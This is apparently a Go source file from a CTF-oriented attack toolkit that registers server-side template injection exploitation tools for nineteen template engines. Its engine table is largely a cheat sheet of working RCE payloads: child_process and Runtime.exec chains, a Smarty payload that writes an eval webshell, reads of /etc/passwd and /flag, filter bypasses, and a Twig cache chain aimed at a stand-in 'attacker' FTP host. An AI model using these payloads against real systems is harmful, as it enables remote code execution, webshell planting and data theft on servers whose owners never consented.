// web.ssti_* —— SSTI 按引擎拆分的工具（对应 legacy/tools/web/ssti_base.py 与 19 个占位符引擎）。
// 仅 ssti_jinja2 为真实实现（ssti_jinja2.go），其余引擎共用本文件的占位符执行器。
package web

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"strings"

	"ctfnet/internal/core"
)

// sstiModes 对应 Python MODES。
var sstiModes = []string{"exec", "read_file", "info", "detect"}

// sstiEngineMeta 占位符引擎元数据（逐字摘自 legacy/tools/web/ssti_<engine>.py）。
type sstiEngineMeta struct {
	Key         string
	Name        string
	Description string
	DefaultMode string
	Plan        string
}

// sstiEngineTable 19 个占位符引擎（顺序无关，注册后按 ID 排序）。
var sstiEngineTable = []sstiEngineMeta{
	{"angularjs", "AngularJS 1.x", "AngularJS 1.x 前端模板注入:constructor.constructor 执行 JS(占位符)", "info",
		"指纹: {{7*7}}→49。\n1.6+ 无沙箱: {{constructor.constructor('alert(1)')()}}\n≤1.5 有沙箱但历史绕过链多;输出型利用(前端 XSS/RCE)。"},
	{"django", "Django", "Django 模板注入:无直接 RCE,仅上下文泄露(% debug / settings),配合伪造 session(占位符)", "info",
		"指纹: {{7*7}} 原样输出(模板语言刻意阉割,无算术)。\n模板层无法直接 RCE,只能泄露上下文: {% debug %} 输出全部变量、{{ settings.SECRET_KEY }} 视上下文是否传入。\n思路: 拿泄露信息配合其他漏洞(伪造 session、进后台),不要指望模板层拿 shell。"},
	{"ejs", "EJS", "EJS(Node) SSTI:模板直接内嵌 JS,execSync 即 RCE(占位符)", "exec",
		"指纹: <%= 7*7 %>→49。\nRCE: <%= global.process.mainModule.require('child_process').execSync(cmd).toString() %>\nrequire 被过滤: global.process.mainModule.constructor._load('child_process')。"},
	{"erb", "ERB", "ERB(Ruby) SSTI:模板直接内嵌 Ruby,<%= system %> 即 RCE(占位符)", "exec",
		"指纹: <%= 7*7 %>→49。\nRCE: <%= system(cmd) %>(注入点落到模板源码即 RCE)。\n过滤一般只拦 <%: 测 %> 拼接、换行符、<%% 变体。"},
	{"fingerprint", "SSTI 自动指纹识别", "多引擎探针指纹识别:识别 Jinja2/Smarty/Twig/FreeMarker/Velocity/Thymeleaf/ERB/Pug 等引擎与版本(占位符)", "detect",
		"探针表: {{7*7}}→Jinja2/Twig/Nunjucks/AngularJS; ${7*7}→FreeMarker/Velocity/EL/Mako; <%= 7*7 %>→ERB/EJS; #{7*7}→Pug; [[7*7]]→Thymeleaf 3 内联; @(7*7)→Razor; {$smarty.version}→Smarty; {{.}}→Go 模板。\nJinja2 确认: {{7*'7'}}→7777777(特有)、{{config}}→Flask 配置对象。\nSmarty 确认: {$smarty.version} 输出版本号、{math equation=\"7*7\"}→49。\n实现: 逐探针发送 → 匹配响应 → 报告引擎与版本。"},
	{"freemarker", "FreeMarker", "FreeMarker(Java) SSTI:?new 实例化 Execute 直接 RCE(占位符)", "exec",
		"指纹: ${7*7}→49。\nRCE(默认未限制 new_builtin_class_resolver): <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(cmd)}\n单行版: ${\"freemarker.template.utility.Execute\"?new()(cmd)}\n变体: ObjectConstructor+ProcessBuilder 构造任意类执行。"},
	{"go", "Go template", "Go 模板注入:无 import/反射,依赖已注册函数与暴露对象(占位符)", "info",
		"指纹: {{.}} 渲染根对象;{{7*7}} 报解析错误(无内建算术)。\n无 import、无反射: 只能调用已注册的模板函数和传入对象的公开方法。\nRCE 取决于应用暴露了什么: 如 {{.Exec \"id\"}} 或传入危险对象;否则只能泄露结构体字段。\nhtml/template 自动转义,但历史上仍有上下文逃逸 CVE(如 CVE-2023-24538)。"},
	{"groovy", "Groovy", "Groovy(Jenkins 等) SSTI:字符串 .execute() 直接跑命令(占位符)", "exec",
		"指纹: ${7*7}→49(Jenkins 场景 ${{7*7}})。\nRCE: ${\"id\".execute().text} —— 字符串 .execute() 直接执行命令。"},
	{"handlebars", "Handlebars", "Handlebars SSTI:无直接 RCE,lookup/with/split 构造 Function 链(占位符)", "info",
		"指纹: {{this}}(logic-less,无算术,{{7*7}} 报错/原样)。\n无直接 RCE: BlackHat 2019(Mahmoud Gamal)用 lookup/with/split/pop/push 摸到 constructor 构造 Function 执行。\nCTF 中更常见当 XSS/信息泄露打,RCE 链题少见。"},
	{"mako", "Mako", "Mako(Python) SSTI:<% %> 原生 Python 代码块直接 RCE(占位符)", "exec",
		"指纹: ${7*7}→49。\nRCE: <% import os %><% print(os.popen(cmd).read()) %>\n<% 被过滤时: ${__import__('os').popen(cmd).read()}。"},
	{"nunjucks", "Nunjucks", "Nunjucks(Node) SSTI:range.constructor 构造 Function 执行命令(占位符)", "exec",
		"指纹: {{7*7}}→49(Jinja2 移植版)。\nRCE: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync(cmd).toString()\")()}}"},
	{"pug", "Pug", "Pug(Node) SSTI:换行另起输出行 = execSync RCE(占位符)", "exec",
		"指纹: #{7*7}→49。\n输入常被拼进模板源码: 换行另起一行输出语句 = global.process.mainModule.require('child_process').execSync(cmd).toString()\n也可构造 - var x = ... 代码行;本质都是 JS 注入。"},
	{"razor", "Razor", "Razor(.NET) SSTI:注入 .cshtml 代码区 Process.Start 执行(占位符)", "exec",
		"指纹: @(7*7)→49。\nRCE: 需注入到 .cshtml 代码区: @System.Diagnostics.Process.Start(\"cmd.exe\",\"/c whoami\")"},
	{"slim", "Slim", "Slim(Ruby) SSTI:行首 = / - 注入 Ruby 语句(占位符)", "exec",
		"指纹: 行首 = 7*7→49。\nRCE: 行首 = 输出命令结果 = %x{cmd};行首 - 静默执行 - system(cmd)。"},
	{"smarty", "Smarty", "Smarty(PHP) SSTI:{system()} 执行、security 沙箱逃逸、include/fetch 文件读(占位符)", "exec",
		"指纹: {$smarty.version}→版本号、{$smarty.security}→1/0、{math equation=\"7*7\"}→49。\n直接 RCE(security 关闭): {system(cmd)}、回显式 {if system(cmd)}{/if}、{passthru(cmd)}、{assert(\"file_put_contents('a.php','<?php @eval($_POST[1]);?>')\")} 写 webshell(PHP7)。\nsecurity 逃逸(3.1.x<3.1.39, CVE-2021-26119/20): {$smarty.template_object->smarty->disableSecurity()} 再 {system(cmd)};3.1.39+ 已修复。\n文件读: {include file='/flag'}、{fetch file='/etc/passwd'}(file_get_contents);Smarty 2: {php}...{/php}、{include_php file=}。\n绕过: 函数名大写 {SYSTEM(cmd)}、引号过滤用 $smarty.get.x 外带、无回显写 webshell / {if} 布尔回显 / DNS 外带。"},
	{"thymeleaf", "Thymeleaf / SpringEL", "Thymeleaf/SpEL(Java) SSTI:预处理表达式 + T(java.lang.Runtime) RCE(占位符)", "exec",
		"指纹: [[7*7]]→49(Thymeleaf 3 内联)、${7*7}→49(SpEL)。\nRCE 预处理表达式: __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(cmd).getInputStream()).next()}__::.x\n无回显探测: __${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}__::.x\n::.x 是模板片段表达式,让预处理在视图解析流程里触发。"},
	{"tornado", "Tornado", "Tornado(Python) SSTI:模板内直接 import 模块 RCE、handler.settings 泄露(占位符)", "exec",
		"指纹: {{7*7}}→49。\nRCE: {%import os%}{{os.popen(cmd).read()}}、{%from os import popen%}{{popen(cmd).read()}}。\n信息泄露: {{handler.settings}} 常含 cookie_secret 等敏感配置。"},
	{"twig", "Twig", "Twig(PHP) SSTI:回调注册 RCE、filter/map/sort 传函数名、source/include 文件读(占位符)", "exec",
		"指纹: {{7*7}}→49、{{constant('PHP_VERSION')}}、{{_self.env}}→Twig Environment(核心攻击面)。\nRCE: {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(cmd)}}\nTwig 1/2: {{[cmd]|filter('system')}}、{{[cmd]|map('system')}};Twig 1.x: {{[cmd,0]|sort('system')}}。\n文件读: {{source('/flag')}}、{{include('/flag')}}。\n老版本逃逸: {{_self.env.setCache(\"ftp://attacker:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}} 缓存目录指向攻击者 FTP 触发 SSRF。"},
	{"velocity", "Velocity", "Velocity(Java) SSTI:反射链 Runtime.exec + Character 逐字节回显(占位符)", "exec",
		"指纹: #set($x=7*7)${x}→49。\nRCE 反射链($s.class 即 getClass()): #set($s=\"\") #set($rt=$s.class.forName(\"java.lang.Runtime\")) #set($ex=$rt.getRuntime().exec(cmd)) $ex.waitFor() #set($out=$ex.getInputStream()) #set($str=$s.class.forName(\"java.lang.String\")) #set($chr=$s.class.forName(\"java.lang.Character\")) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end\n无回显场景可改 DNS 外带。"},
}

// sstiParams 与 Python SstiEngineTool.params 一致。
func sstiParams() []core.ParamSpec {
	return []core.ParamSpec{
		{Name: "target_url", Type: "str", Required: false,
			Description: "注入点 URL（模板回显所在的请求端点）；粘贴原始数据包时可留空"},
		{Name: "param", Type: "str", Required: false,
			Description: "注入参数名（表单字段 / URL 参数）；原始数据包解析后可选择，留空自动选第一个"},
		{Name: "method", Type: "str", Required: false, Default: "POST",
			Description: "请求方法：GET / POST"},
		{Name: "raw_request", Type: "text", Required: false, Default: "",
			Description: "原始 HTTP 请求包（请求行 + Host/头 + 空行 + Body）。粘贴后自动解析" +
				"URL/方法/请求头/参数，其余参数按原值固定附带；仅支持 urlencoded 表单"},
		{Name: "mode", Type: "str", Required: false,
			Description: "exec=命令执行 / read_file=任意文件读 / " +
				"info=信息收集 / detect=指纹确认"},
		{Name: "command", Type: "str", Required: false, Default: "id",
			Description: "exec 模式要执行的命令"},
		{Name: "file_path", Type: "str", Required: false, Default: "/etc/passwd",
			Description: "read_file 模式要读取的路径"},
		{Name: "probe", Type: "text", Required: false, Default: "",
			Description: "自定义指纹探针（留空使用内置探针）"},
		{Name: "payload", Type: "text", Required: false, Default: "",
			Description: "自定义 payload（留空按模式自动构造）"},
		{Name: "extra_params", Type: "text", Required: false, Default: "",
			Description: "额外固定参数，格式 a=1&b=2（如 team_name=x），每个请求都附带；" +
				"POST 并入表单，GET 并入查询串"},
	}
}

// sstiPlaceholderTool 占位符引擎（等价 Python SstiEngineTool.run() 的占位行为）。
type sstiPlaceholderTool struct {
	core.BaseTool
	meta sstiEngineMeta
}

// init 注册 19 个占位符引擎。
func init() {
	for _, meta := range sstiEngineTable {
		meta := meta
		tool := &sstiPlaceholderTool{meta: meta}
		tool.BaseTool = core.BaseTool{
			NameAttr:        "ssti_" + meta.Key,
			CategoryAttr:    core.CatWeb,
			VersionAttr:     "0.1.0",
			DescriptionAttr: meta.Description,
			TimeoutAttr:     60,
			ParamsAttr:      sstiParams(),
			Runner:          tool.run,
		}
		core.DefaultRegistry.Register(tool)
	}
}

// validateSsti 对应 SstiEngineTool.validate_params：mode 默认值、target_url/raw_request 二选一。
func validateSsti(base *core.BaseTool, defaultMode string, params map[string]any) (map[string]any, error) {
	validated, err := base.ValidateParams(params)
	if err != nil {
		return nil, err
	}
	if _, ok := validated["mode"]; !ok || paramStr(validated, "mode") == "" {
		validated["mode"] = defaultMode
	}
	if paramStr(validated, "target_url") == "" && paramStr(validated, "raw_request") == "" {
		return nil, fmt.Errorf("需要 target_url（靶机端点）或 raw_request（原始数据包）之一")
	}
	if paramStr(validated, "raw_request") == "" && paramStr(validated, "param") == "" {
		return nil, fmt.Errorf("缺少注入参数名 param（粘贴原始数据包时留空则自动选第一个参数）")
	}
	return validated, nil
}

func (t *sstiPlaceholderTool) ValidateParams(params map[string]any) (map[string]any, error) {
	return validateSsti(&t.BaseTool, t.meta.DefaultMode, params)
}

func (t *sstiPlaceholderTool) run(ctx context.Context, params map[string]any, tc *core.ToolContext) (*core.ToolResult, error) {
	mode := paramStr(params, "mode")
	if mode == "" {
		mode = t.meta.DefaultMode
	}
	if !containsStr(sstiModes, mode) {
		return &core.ToolResult{
			Status: core.StatusError,
			Stderr: fmt.Sprintf("未知模式: %s（可选: %s）", mode, strings.Join(sstiModes, ", ")),
		}, nil
	}
	lines := []string{
		fmt.Sprintf("[占位符] %s SSTI 利用 —— 功能开发中", t.meta.Name),
		"",
		"本次调用参数:",
		orderedParamsJSON(params),
		"",
		"实现要点:",
		firstNonEmpty(t.meta.Plan, "(未填写)"),
		"",
		fmt.Sprintf("当前调用: mode=%s", mode),
		fmt.Sprintf("  注入点: %s %s", paramDefault(params, "method", "POST"), paramDefault(params, "target_url", "")),
		fmt.Sprintf("  参数名: %s", paramDefault(params, "param", "")),
	}
	if mode == "exec" {
		lines = append(lines, fmt.Sprintf("  目标命令: %s", paramDefault(params, "command", "id")))
	}
	if mode == "read_file" {
		lines = append(lines, fmt.Sprintf("  目标路径: %s", paramDefault(params, "file_path", "/etc/passwd")))
	}
	return &core.ToolResult{
		Status: core.StatusSuccess,
		Stdout: strings.Join(lines, "\n") + "\n",
		Data:   map[string]any{"engine": t.meta.Key, "mode": mode, "placeholder": true},
	}, nil
}

// orderedParamsJSON 按参数声明顺序输出 JSON（对齐 Python json.dumps 的插入序）。
func orderedParamsJSON(params map[string]any) string {
	order := []string{"target_url", "param", "method", "raw_request", "mode", "command", "file_path", "probe", "payload", "extra_params"}
	var b strings.Builder
	b.WriteString("{")
	first := true
	for _, k := range order {
		v, ok := params[k]
		if !ok || v == nil {
			continue
		}
		if !first {
			b.WriteString(",")
		}
		first = false
		b.WriteString("\n  " + jsonQuote(k) + ": " + jsonValue(v))
	}
	b.WriteString("\n}")
	return b.String()
}

func jsonQuote(s string) string {
	var b strings.Builder
	b.WriteByte('"')
	for _, r := range s {
		switch r {
		case '"':
			b.WriteString(`\"`)
		case '\\':
			b.WriteString(`\\`)
		case '\n':
			b.WriteString(`\n`)
		case '\r':
			b.WriteString(`\r`)
		case '\t':
			b.WriteString(`\t`)
		default:
			if r < 0x20 {
				b.WriteString(fmt.Sprintf(`\u%04x`, r))
			} else {
				b.WriteRune(r)
			}
		}
	}
	b.WriteByte('"')
	return b.String()
}

func jsonValue(v any) string {
	switch val := v.(type) {
	case string:
		return jsonQuote(val)
	case bool:
		return fmt.Sprintf("%t", val)
	case float64:
		return fmt.Sprintf("%g", val)
	case int:
		return fmt.Sprintf("%d", val)
	case nil:
		return "null"
	default:
		return jsonQuote(fmt.Sprintf("%v", val))
	}
}

func containsStr(list []string, s string) bool {
	for _, x := range list {
		if x == s {
			return true
		}
	}
	return false
}

func paramDefault(params map[string]any, key, def string) string {
	if v := paramStr(params, key); v != "" {
		return v
	}
	return def
}

func firstNonEmpty(a, b string) string {
	if a != "" {
		return a
	}
	return b
}

// —— parseRawHTTPRequest ——

// parsedHTTPRequest 对应 Python parse_raw_http_request 的返回。
type parsedHTTPRequest struct {
	Method  string
	URL     string
	Headers map[string]string
	Params  [][2]string
}

var requestLineRe = regexp.MustCompile(`^(\w+)\s+(\S+)(?:\s+HTTP/\d(?:\.\d)?)?\s*$`)

// parseRawHTTPRequest 解析原始 HTTP 请求包（Burp/浏览器复制格式）。
// 仅支持 urlencoded 表单与查询参数作为注入载体；multipart/json 抛错。
func parseRawHTTPRequest(raw string) (*parsedHTTPRequest, error) {
	text := strings.ReplaceAll(raw, "\r\n", "\n")
	text = strings.ReplaceAll(text, "\r", "\n")
	text = strings.TrimLeft(text, "\n")
	lines := strings.Split(text, "\n")
	m := requestLineRe.FindStringSubmatch(lines[0])
	if m == nil {
		return nil, fmt.Errorf("无法解析请求行: %q", lines[0])
	}
	method, target := m[1], m[2]

	headers := map[string]string{}
	idx := 1
	for i := 1; i < len(lines); i++ {
		line := lines[i]
		if strings.TrimSpace(line) == "" {
			idx = i + 1
			break
		}
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			headers[strings.ToLower(strings.TrimSpace(parts[0]))] = strings.TrimSpace(parts[1])
		}
	}
	body := strings.TrimSpace(strings.Join(lines[idx:], "\n"))

	var fullURL string
	if strings.HasPrefix(target, "http://") || strings.HasPrefix(target, "https://") {
		fullURL = target
	} else {
		host := headers["host"]
		if host == "" {
			return nil, fmt.Errorf("请求行是相对路径时必须带 Host 头")
		}
		scheme := "http"
		if strings.HasSuffix(host, ":443") {
			scheme = "https"
		}
		fullURL = scheme + "://" + host + target
	}

	// 查询串在前、表单在后（与 Python parse_qsl 顺序一致）
	params := parseQS(queryOf(fullURL))
	ctype := headers["content-type"]
	if strings.TrimSpace(body) != "" {
		if strings.Contains(ctype, "multipart") {
			return nil, fmt.Errorf("暂不支持 multipart/form-data 原始包")
		}
		params = append(params, parseQS(body)...)
	}
	return &parsedHTTPRequest{Method: method, URL: fullURL, Headers: headers, Params: params}, nil
}

func queryOf(rawURL string) string {
	if i := strings.Index(rawURL, "?"); i >= 0 {
		return rawURL[i+1:]
	}
	return ""
}

// parseQS 对应 urllib.parse.parse_qsl(keep_blank_values=True)：保序、保空值、+ 转空格。
func parseQS(qs string) [][2]string {
	var out [][2]string
	if qs == "" {
		return out
	}
	for _, part := range strings.Split(qs, "&") {
		var k, v string
		if i := strings.Index(part, "="); i >= 0 {
			k, v = part[:i], part[i+1:]
		} else {
			k = part
		}
		out = append(out, [2]string{queryUnescape(k), queryUnescape(v)})
	}
	return out
}

// queryUnescape 等价 urllib.parse.unquote_plus（parse_qsl 的默认解码）。
func queryUnescape(s string) string {
	if out, err := url.QueryUnescape(s); err == nil {
		return out
	}
	return s
}
